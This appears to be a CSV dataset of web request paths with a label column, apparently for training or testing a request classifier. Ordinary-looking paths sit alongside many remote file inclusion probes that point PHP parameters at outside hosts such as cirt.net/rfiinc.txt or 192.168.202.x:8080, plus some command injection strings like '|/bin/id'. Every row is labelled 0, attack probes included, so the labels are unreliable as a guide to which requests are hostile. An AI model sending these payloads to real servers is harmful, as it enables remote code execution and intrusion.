url,label
/includes/functions_kb.php?phpbb_root_path=http://cirt.net/rfiinc.txt?,0
/fid3edc55edb6ea67317d0377d527ef20508adf6578/,0
/main/is_cgi_installed3_main.php794174479~,0
/2004 international religious freedom report/,0
/somery/team.php?checkauth=http://192.168.202.96:8080/vir0v3xfc?,0
/fckeditor/editor/dialog/fck_link.php?dirroot=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/root/public/code/cp_html2txt.php?page=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/development.php?root_prefix=http://cirt.net/rfiinc.txt??,0
/7 worlds collide - live at the st james/,0
/examples/jsp/jsp2/el/index.php?file=news&op=phpinfo,0
/rempass.php?lang=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/examples/servlets/servlet/wihphoto/start.php,0
/classes/adodbt/sql.php?classes_dir=http://192.168.202.96:8080/swgnhpydbq0t?,0
/\xd0\xa1\xd1\x83\xd1\x81\xd0\xbf\xd1\x96\xd0\xbb\xd1\x8c\xd1\x81\xd1\x82\xd0\xb2\xd0\xbe/,0
/index.php?amv_openconfig=1&amv_serverpath=http://192.168.202.118:8080/ghl9il?,0
/examples/jsp/jsp2/jspx/textrotate.jspx~,0
/l2zvcnvtl3jlbwfyayw0nda3ody0fnjvb3q9c2vjdxjpdhksmx5tb2rlpwzsyxq=/,0
/cwb/comanda.php?include_path=http://192.168.202.96:8080/txenjrxf3??,0
/environment.php?dir_prefix=http://192.168.202.118:8080/ghl9il?,0
/lib/classes/swift/transport/loadbalancedtransport.php.1,0
/phpmyadmin/wps_shop.cgi?action=showartikel&cat=nessus&catname=nessus&art=|id|,0
/water illusion screensaver_information/,0
/modules/addons/plugin.php?doc_root=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/modules/projects/index.php?full_path=http://192.168.202.118:8080/ghl9il?,0
/interface/new/new_patient_save.php?srcdir=http://cirt.net/rfiinc.txt??,0
/beacon/language/1/splash.lang.php?languagepath=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/include.php?myng_root=http://192.168.202.118:8080/tzhfyzkbomspvm?,0
/b\xc3\xb6lcs\xc3\xa9sztudom\xc3\xa1nyok/,0
/debugger.php?config_atkroot=http://192.168.202.96:8080/no4ghqiguzhst?,0
/components/com_articles.php?absolute_path=@rfiurl,0
/window.php?action=http://cirt.net/rfiinc.txt?,0
/track.php?path=http://cirt.net/rfiinc.txt?,0
/qte_web.php?qte_web_path=@rfiurl?qte_web_path=@rfiurl?,0
/dj smallz and chopper - all eyez on me/,0
/examples/jsp/jsp2/jspx/infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id,0
/pentagonweighsiraqiplantosecurebaghdad/,0
/fid6bc392e4b49a50e2f8655c9d32b1eb08a2bb139a/,0
/microsoft visio viewer 2002_information/,0
/spojen\xc3\xa9_kr\xc3\xa1lovstv\xc3\xad/,0
/x3 reunion pdf manual dvd cover dvd label/,0
/block.php?include=http://192.168.202.96:8080/no4ghqiguzhst?,0
/depouilg.php3?nomvote=http://192.168.202.118:8080/zz5thkvtmlgl??,0
/lib/classes/swift/mime/embeddedfile.php.bak,0
/setup/index.php?gallery_basedir=http://xxxxxxxx/,0
/bracelets_w0qqfromzr4qqsacatz10975qqsocmdzlistingitemlistqqsspagenamezdcpjewelrytextnonfeat/,0
/s02.php?shopid=http://192.168.202.118:8080/ghl9il??,0
/depeche mode - the secret remixes vol 04/,0
/authenticate.php?default_path_for_themes=http://cirt.net/rfiinc.txt??,0
/rising antivirus personal edition 2005_information/,0
/files/login.php3?err=hack&bsx_htxdir=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/cross.php?url=http://192.168.202.118:8080/zz5thkvtmlgl?,0
/coldfusion_double_encoded_null_info_disclosure-1331999931.asp%00.cfm,0
/auto_check_renewals.php?installed_config_file=http://cirt.net/rfiinc.txt??cmd=ls,0
/includes/ajax_listado.php?urlmodulo=http://192.168.202.118:8080/moclyxlwqyfjnp?,0
/admin/include/lib.module.php?mod_root=http://192.168.202.118:8080/ghl9il?,0
/admin_t/include/aff_liste_langue.php?rep_include=http://xxxxxxxx/,0
/source/mod/rss/channeledit.php?codebase=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/chicken run soundtrack - john powell and harry gregson williams/,0
/bowling for soup - drunk enough to dance/,0
/javascript/oracle.xml.xsql.xsqlservlet.do,0
/includes/connection.inc.php?pageprefix=@rfiurl,0
/suite/index.php?pg=http://cirt.net/rfiinc.txt??,0
/99ed00a2066fcd89852572590057dc39!opendocument/,0
/en-us/static/@95063/img/skins/default/overlay_bottomgradient_soft.png,0
/extras/poll/poll.php?file_newsportal=http://192.168.202.118:8080/2aibfaczmac8?,0
/soccer_w0qqfromzr4qqsacatz20862qqsocmdzlistingitemlistqqsspagenamezdcpsporttextnonfeat/,0
/admin/tools/utf8conversion/index.php?path=http://192.168.202.96:8080/frznctvhi0i5??,0
/language/lang_german/lang_main_album.php?phpbb_root_path=http://cirt.net/rfiinc.txt??a=,0
/ibm rational\xae requisitepro\xae v2003/,0
/nvidia ntune performance application_information/,0
/_pages/_webapp/_admin/_showpooldetails.java,0
/handlers/email/mod.listmail.php?_pm_[path][handle]=http://192.168.202.96:8080/txenjrxf3?,0
/index2.php?s=http://192.168.202.96:8080/4dckqcc0acprbz?,0
/theme/format.php?_page_css=http://192.168.202.118:8080/ghl9il??,0
